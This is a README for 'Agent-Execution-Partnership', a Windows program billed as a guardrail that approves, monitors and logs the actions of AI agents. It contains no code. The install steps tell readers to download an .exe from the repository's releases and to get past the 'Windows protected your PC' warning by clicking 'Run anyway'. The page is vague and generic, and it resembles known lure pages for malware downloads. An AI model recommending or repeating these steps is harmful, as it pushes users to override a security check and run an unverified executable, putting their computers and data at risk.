# 🛡️ Agent-Execution-Partnership - Safely authorize your autonomous AI agents

[![Download Agent-Execution-Partnership](https://img.shields.io/badge/Download-Application-grey.svg)](https://github.com/rickyunpotted334/Agent-Execution-Partnership)

Agent Execution Partnership (AEE) acts as a guardrail for your digital assistants. Modern AI agents perform tasks on your computer, such as sending emails, moving files, or browsing the internet. This software ensures that every action remains under your control. It reviews requests before they happen, monitors progress in real time, and logs results for your review.

## ⚙️ Why use this software

Autonomous agents grow more capable every day. This capability creates risk if those agents act without oversight. AEE provides a central hub to manage these interactions. It stops unauthorized changes, keeps a history of agent behavior, and verifies that tasks finish as expected. You oversee AI behavior without writing a single line of code.

## 💻 System requirements

Your computer must meet these basic standards to run the application:

*   Operating System: Windows 10 or Windows 11.
*   Processor: Intel Core i3 or equivalent, 1.6 GHz minimum.
*   Memory: 8 GB RAM.
*   Disk Space: 500 MB of available storage.
*   Network: Stable internet connection for agent verification.

## 📥 Downloading the software

Follow these steps to get the application onto your machine:

1. Visit the project website at: [https://github.com/rickyunpotted334/Agent-Execution-Partnership](https://github.com/rickyunpotted334/Agent-Execution-Partnership)
2. Locate the "Releases" section on the right side of the page.
3. Click on the latest release version.
4. Select the file ending in ".exe" to begin the download.
5. Save the file to your "Downloads" folder.

## 🚀 Setting up the application

Once the download finishes, follow these steps to install the software:

1. Open your "Downloads" folder.
2. Double-click the downloaded ".exe" file.
3. Windows might show a security prompt. If you see "Windows protected your PC," click "More info" and then "Run anyway."
4. Follow the instructions in the setup window. This process configures the necessary folders and permissions on your drive.
5. Click "Finish" to launch the AEE dashboard.

## 📋 Managing your agents

When the application opens, you see a blank list of agents. To connect an agent, follow this process:

1. Click the "Add Agent" button in the top corner.
2. Link the folder or the service path where your AI agent currently lives.
3. The software will detect the agent and ask for your preferred safety level.
4. Choose "Strict" for maximum security or "Flexible" for faster task execution.
5. Click "Save," and your agent now reports to the AEE control plane.

## 🔍 How AEE works

The AEE dashboard monitors activity through three distinct phases:

### Phase 1: Authorization
Before an agent moves a file or sends a message, it sends a request to AEE. A notification will appear on your screen if the request violates your settings. You have the final say. You can click "Approve" or "Deny" based on the request details provided in the notification box.

### Phase 2: Observation
While an agent works, AEE runs in the background. It watches system calls and network traffic. You can view a live feed of active processes by clicking the "Monitor" tab. If an agent starts a task you do not recognize, click "Kill Task" to stop it instantly.

### Phase 3: Verification
After a task ends, AEE puts all data into a secure log. You can search these logs by date, agent name, or status. The verifier tool checks that the output matches your expectations. If an agent saved a file, AEE confirms the file exists and contains the correct information.

## 🛠️ Troubleshooting common issues

If you encounter trouble, check these common fixes:

*   Does the app fail to start? Ensure your computer has the latest Windows updates installed.
*   Do agents run without approval? Check the "Policy" tab and ensure "Auto-approve" is turned off.
*   Is the interface blank? Refresh the dashboard by hitting the "F5" key on your keyboard.
*   Can you find the logs? All activity files stay in the "AEE_Logs" folder located in your user Documents directory.

## 🔒 Keeping your agents secure

Security relies on your oversight. Review your logs at least once a week. If you notice strange activity, disconnect that specific agent immediately through the "Manage" tab. We recommend keeping the application open while you work so it can interrupt harmful requests in real time.

Keywords: agent-safety, ai-agents, ai-governance, ai-safety, audit-trail, autonomous-agents, control-plane, llm-agents, mlops, policy-engine, python